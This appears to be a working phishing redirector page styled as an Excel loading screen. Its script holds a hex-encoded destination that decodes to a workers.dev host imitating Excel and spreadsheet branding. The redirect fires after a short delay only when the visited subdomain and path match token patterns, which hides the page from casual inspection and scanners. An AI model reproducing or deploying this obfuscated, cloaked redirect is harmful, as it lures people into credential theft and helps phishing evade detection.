<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<style>
.loading{
display:flex;
gap:12px;
justify-content:center;
align-items:center;
height:100vh;
}

.dot{
width:20px;
height:20px;
background:#217346;
border-radius:50%;
animation:bounce 1.4s infinite ease-in-out both;
}

.dot:nth-child(1){animation-delay:-0.32s;}
.dot:nth-child(2){animation-delay:-0.16s;}
.dot:nth-child(3){animation-delay:0s;}

@keyframes bounce{
0%,80%,100%{transform:scale(0);}
40%{transform:scale(1);}
}

#loader{
display:none;
}
</style>
</head>

<body>

<div id="loader" class="loading">
<div class="dot"></div>
<div class="dot"></div>
<div class="dot"></div>
</div>

<script>

/* HEX redirect destination */
const hexURL =
"68747470733a2f2f626c7537306c336673312d657863656c2d6f70656238323531636964393133783373353473707265656473686565657473302d313062632e636f6d30323930362e776f726b6572732e6465762f";

/* hex decoder */
function hexToString(hex){
let str="";
for(let i=0;i<hex.length;i+=2){
str += String.fromCharCode(parseInt(hex.substr(i,2),16));
}
return str;
}

function validateURL(){

let hostname = window.location.hostname;
let path = window.location.pathname;

/* extract first subdomain */
let subdomain = hostname.split(".")[0];

/* remove leading slash */
let structure = path.replace(/^\/+/,"");

/* validation rules */
let subPattern = /^[A-Z]{8}-[0-9]{9}$/;
let endPattern = /^[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;

if(subPattern.test(subdomain) && endPattern.test(structure)){

document.getElementById("loader").style.display="flex";

setTimeout(function(){

let finalURL = hexToString(hexURL);

window.location.replace(finalURL);

},2000);

}

}

validateURL();

</script>

</body>
</html>
